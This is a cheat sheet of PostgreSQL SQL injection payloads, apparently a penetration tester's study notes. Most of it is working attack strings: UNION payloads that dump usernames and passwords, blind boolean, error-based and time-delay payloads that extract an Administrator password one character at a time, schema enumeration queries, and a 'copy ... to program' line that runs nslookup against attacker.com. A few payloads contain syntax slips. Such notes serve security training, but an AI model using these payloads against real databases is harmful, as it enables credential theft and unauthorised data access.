

## PostgreSQL

### Retreaving Database version

```mysql
SELECT version()
```

**UNION Statement Context**
```
' UNION SELECT NULL, version() -- -
```

> **Note:** In UNION Statement we have to match the number of columns of first select statement so that's why we use one NULL in the payload.

### String Concatenation

```
SELECT username||':'||password FROM users
```

**UNION Statement Context**

```
' UNION SELECT NULL,username||':'||password) FROM users-- -
```

### Substring

```
SELECT SUBSTRING(password, 2,1) FROM users where username = 'administrator'
```

> **Note:** In the above query we only extract second character of Administrator users password with the length of one that's mean only one character at a time. SUBSTRING Function has a syntax like this `SUBSTRING(string , start position, total length)`

**In a blind SQLi Context where we have some difference in response**

```
' AND SELECT SUBSTRING((SELECT Password FROM Users Where Username = 'Administrator'),1,1) = FUZZ
```
> **Note:** Suppost we have a blind SQLi in which we have some difference in response like Content Length or any wellcome back message of successfull login etc. Using above query we add a True or False condition using `AND` keyword so when  Password of the Administrator user have a character equal to or FUZZ character then they shows us a welcome back message or different content length otherwise they didn't show us that.
> In FUZZ we have a dictionary that contain all alpha-numeric characters and symbols.

### Comments
```
-- comment
/* comment */
```

### Conditional Errors

```
1 = (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'Administrator'), 1, 1) = 'a') THEN CAST(1/0 AS INTEGER) ELSE NULL END)
```

**In SQLi Context**

```
' AND SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'Administrator'), 1, 1) = 'a') THEN CAST(1/0 AS INTEGER) ELSE NULL END
```

### Time Delays

```
SELECT pg_sleep(10)
```

**Blind SQLi Context**

```
' AND SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'Administrator'), 1, 1) = 'FUZZ') THEN pg_sleep(10) ELSE NULL END
```

### DNS Lookups

```
copy (SELECT '') to program 'nslookup attacker.com'
```

### Database Contents

**List all the tables**
```
 SELECT table_name FROM information_schema.tables
```

**USING UNION Statement**
```
' UNION  SELECT NULL,table_name FROM information_schema.tables -- -
```


**List all the columns in a Table**
```
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

**Using UNION Statement**
```
' UNION SELECT NULL, column_name FROM information_schema.columns where table_name = 'TABLE_NAME_HERE'
```